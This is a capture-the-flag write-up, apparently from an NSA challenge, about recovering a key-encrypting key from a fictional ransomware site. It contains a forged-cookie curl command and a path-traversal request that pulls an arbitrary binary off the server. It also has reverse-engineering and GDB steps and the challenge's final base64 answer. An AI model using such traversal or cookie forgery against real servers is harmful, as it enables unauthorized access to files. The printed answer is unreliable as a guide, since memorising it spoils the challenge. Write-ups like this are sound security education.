# Task 8

## Background
> You're an administrator! Congratulations!
>
> It still doesn't look like we're able to find the key to recover the victim's files, though. Time to look at how the site stores the keys used to encrypt victim's files. You'll find that their database uses a "key-encrypting-key" to protect the keys that encrypt the victim files. Investigate the site and recover the key-encrypting key.
>
> ### Prompt:
> Enter the base64-encoded value of the key-encrypting-key

## Writeup
TL;DR: Retrieve the `keyMaster` binary via `/fetchlog`, then disassemble it and find the key-encrypting-key.

First, we need to find out how users of the ransomware-as-a-service site manage their keys. Looking at the main route function in `server.py`, we find `/lock`, which calls the following:
```python
def lock():
	if request.args.get('demand') == None:
		return render_template('lock.html')
	else:
		cid = random.randrange(10000, 100000)
		result = subprocess.run(["/opt/keyMaster/keyMaster", 
								 'lock',
								 str(cid),
								 request.args.get('demand'),
								 util.get_username()],
								 capture_output=True, check=True, text=True, cwd="/opt/keyMaster/")
		jsonresult = json.loads(result.stdout)
		if 'error' in jsonresult:
			response = make_response(result.stdout)
			response.mimetype = 'application/json'
			return response
		
		with open("/opt/ransommethis/log/keygeneration.log", 'a') as logfile:
			print(f"{datetime.now().replace(tzinfo=None, microsecond=0).isoformat()}\t{util.get_username()}\t{cid}\t{request.args.get('demand')}", file=logfile)
		return jsonify({'key': jsonresult['plainKey'], 'cid': cid})
```

This seems to be how attackers create keys to use in ransomware attacks. The actual functionality is delegated to a separate binary at `/opt/keyMaster/keyMaster`, which isn't in the directory we retrieved as part of task B2. However, there is this useful looking function (and associated route `/fetchlog`):
```python
def fetchlog():
	log = request.args.get('log')
	return send_file("/opt/ransommethis/log/" + log)
```

Obviously, we could use it to get the key generation log written to by `/lock` with the following:
```bash
$ python3 forge_token.py 9076 > admin_cookie
$ curl --cookie admin_cookie "https://xekflqhmhrsoelot.ransommethis.net/jphzwhdbesknahns/fetchlog?log=keygeneration.log" > keygeneration.log
```

However, we can also use this to get any arbitrary file on the server by using relative paths.
```bash
$ curl --cookie admin_cookie "https://xekflqhmhrsoelot.ransommethis.net/jphzwhdbesknahns/fetchlog?log=../../keyMaster/keyMaster" > keyMaster
```

Let's find out a little bit more about this binary.
```
$ file keyMaster
keyMaster: : ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, Go BuildID=KwZZ6q8tGaR-eMN042Fm/SFNbb3GMlo6_WxKE2Y-g/4gc0eHCynGI2ixyFBj4U/_VeLrbhqyqXYGI0LJSZr, BuildID[sha1]=3629ee1dd8d4e98bc3b81c8a284e08170c814555, stripped
$ go version keyMaster
keyMaster: go1.18.3
```

So it looks like we have a Go 1.18 binary. Unfortunately, the Go analyzer for Ghidra says it's for version 1.12, so it might have a few issues. However, IDA Freeware 8.1 (actually any version starting with 8.0) has support for Go 1.18, so I used that instead of Ghidra. After letting IDA do its analysis, we can see that even though `file` says the binary is stripped, IDA was able to recover basically all the function names. Since I'm not too familiar with Go, I created a test program in [Godbolt](https://godbolt.org/) to see what the entry point name looks like, which apparently is `main_main`. Luckily, IDA shows a function with that exact name.

From `server.py`, we know that, in addition to generating keys, `keyMaster` has other functionality. Therefore, it is pretty safe to assume that it will first check the CLI args to determine what functionality to perform. Pretty early on we see these instructions:
```asm
cmp dword ptr [rsi], 6F6C6E75h
jnz loc_5B9C0A
```
The hex value can be interpreted as `"unlo"`, after accounting for endianess. This must be the "unlock" functionality, so we want to take the branch, since we're looking for "lock".
```asm
cmp dword ptr [rsi], 6B636F6Ch
nop
jnz loc_5BA3E3
```
This one compares against `"lock"`, which is what we're looking for. Moving on, and ignoring the error branches, which we can easily identify because it makes a map with the key "error", we see a call to `main_DchO32CDDK0`. Looking in there, it just seems to generate a UUID, so we can probably ignore it.

After a couple more branches, we find a call to `main_mtHO6enMvyA`. This one starts with calls to `crypto_rand_read` and `crypto_aes_NewCipher`, so it seems to be the key encryption part of the "lock" functionality. Looking at `main_p4hsJ3KeOvw`, which is sandwiched between `crypto_rand_read` and `crypto_aes_newCipher`, we can see it decodes a base-64 string hard-coded into the binary! But looking a little further, there's a call to `x_crypto_pbkdf2_Key` before the function returns, so the hard-coded string seems to just be a red herring; the actual key is probably whatever comes out of PBKDF2. The actual call looks like

<table>
<tr>
<td>

```asm
mov rax, rdx
mov rbx, r8
mov rcx, rbx
mov rdi, [rsp+90h+var_20]
mov rsi, [rsp+90h+var_40]
mov r8, [rsp+90h+var_38]
mov r9d, 1000h
mov r10d, 20h
lea r11, off_6E7A88
call golang_org_x_crypto_pbkdf2_Key
```

</td>
<td>

from the [Go docs](https://pkg.go.dev/golang.org/x/crypto/pbkdf2#Key):
```go
func Key(password, salt []byte, iter, keyLen int, h func() hash.Hash) []byte
```

</td>
</tr>
</table>

Based on the order of the register loads, and the fact that `r11` gets the address of a function (`crypto_sha256_New`, to be precise), we can infer that `keyLen` is probably in `r10`, and thus is `0x20 = 32` bytes. Now, we can use GDB to dynamically get the return value, which will be in `rax`, per calling convention (obligatory reminder to never run random binaries you happen across on your host machine, even (especially?) if it's from the NSA).
```
(gef)  b *0x5b859d
Breakpoint 1 at 0x5b859d
(gef)  r lock 100 1.00 LamentableConservative
...
(gef)  x/32bx $rax
0xc000148100:   0x75    0xa6    0x4c    0xd1    0x20    0x72    0x74    0x60
0xc000148108:   0x99    0x3c    0x9e    0x93    0xe7    0x53    0x2e    0xc0
0xc000148110:   0x8b    0xac    0x6a    0x11    0xe3    0x24    0x2c    0x25
0xc000148118:   0x68    0x83    0x84    0x35    0x07    0x6f    0x23    0x18
```

Since we want this key in base-64, we'll need to do a little re-formatting.
```
(gef)  python
>import base64
>print(base64.b64encode(gdb.inferiors()[0].read_memory(0xc000148100, 0x20).tobytes()))
b'daZM0SBydGCZPJ6T51MuwIusahHjJCwlaIOENQdvIxg='
```

Now if we put this into the answer box, we get our task 8 badge!